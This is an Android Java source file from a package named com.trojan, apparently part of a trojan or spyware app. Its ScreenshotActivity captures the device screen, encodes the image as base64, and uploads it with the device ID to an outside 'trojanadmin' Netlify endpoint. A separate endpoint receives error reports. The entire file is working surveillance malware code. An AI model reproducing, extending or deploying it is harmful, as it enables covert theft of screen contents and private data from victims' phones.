// FILE: app/src/main/java/com/trojan/ScreenshotActivity.java

package com.trojan;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenshotActivity extends Activity {

    private static final String TAG = "ScreenshotActivity";
    private static final int REQUEST_CODE = 100;
    private MediaProjectionManager mProjectionManager;
    private MediaProjection mProjection;
    private VirtualDisplay mVirtualDisplay;
    private ImageReader mImageReader;
    private Handler mHandler;
    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestQueue = Volley.newRequestQueue(this);
        mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mProjectionManager.createScreenCaptureIntent(), REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK) {
                Log.i(TAG, "MediaProjection permission granted. Starting capture.");
                mProjection = mProjectionManager.getMediaProjection(resultCode, data);
                if (mProjection != null) {
                    mHandler = new Handler(Looper.getMainLooper());
                    mHandler.postDelayed(this::startCapture, 100);
                }
            } else {
                Log.e(TAG, "MediaProjection permission was not granted.");
                uploadError("Screenshot failed: Permission denied by user");
                finish();
            }
        }
    }

    private void startCapture() {
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int density = metrics.densityDpi;
        int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;

        mImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        mVirtualDisplay = mProjection.createVirtualDisplay("screencap", width, height, density, flags, mImageReader.getSurface(), null, mHandler);

        mImageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            Bitmap bitmap = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);

                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
                    String encodedString = Base64.encodeToString(byteArrayOutputStream.toByteArray(), Base64.DEFAULT);

                    uploadBase64File("screenshot", encodedString);
                    croppedBitmap.recycle();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error while processing screenshot", e);
                uploadError("Screenshot processing failed: " + e.getMessage());
            } finally {
                if (bitmap != null) bitmap.recycle();
                if (image != null) image.close();
                stopCapture();
                finish();
            }
        }, mHandler);
    }

    private void stopCapture() {
        if (mVirtualDisplay != null) mVirtualDisplay.release();
        if (mImageReader != null) mImageReader.close();
        if (mProjection != null) mProjection.stop();
    }
    
    private void uploadBase64File(String dataType, String base64Data) {
        String url = "https://trojanadmin.netlify.app/.netlify/functions/upload-file";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
                response -> Log.i(TAG, "Screenshot uploaded successfully."),
                error -> Log.e(TAG, "Screenshot upload failed: " + error.toString()));
            requestQueue.add(request);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create screenshot upload JSON", e);
        }
    }

    private void uploadError(String errorMessage) {
        String url = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
            postData.put("dataType", "screenshot_error");
            postData.put("payload", errorMessage);
            requestQueue.add(new JsonObjectRequest(Request.Method.POST, url, postData, r -> {}, e -> {}));
        } catch (JSONException e) {
            Log.e(TAG, "Could not create error report JSON", e);
        }
    }
}
